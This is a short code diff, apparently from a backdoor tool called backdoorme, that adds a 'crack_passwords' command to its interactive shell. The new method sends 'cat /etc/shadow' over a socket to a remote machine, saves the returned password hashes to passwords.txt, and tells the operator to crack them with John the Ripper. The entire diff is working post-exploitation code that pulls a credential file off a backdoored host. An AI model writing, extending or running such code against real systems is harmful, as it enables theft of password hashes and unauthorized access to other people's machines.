@@ -60,6 +60,14 @@ class Interpreter(cmd.Cmd):
 	def emptyline(self):
 		pass
 
+	def do_crack_passwords(self, args):
+		self.sock[0].send("cat /etc/shadow\n")
+		time.sleep(.25)
+		crackString = self.sock[0].recv(0x10000)
+		tfile = open("passwords.txt", "w")
+		tfile.write(crackString)
+		tfile.close()
+		print("Type \'john --show passwords.txt\' in a new terminal in the backdoorme directory.")
 	#override
 	def default(self, line):
 		try:
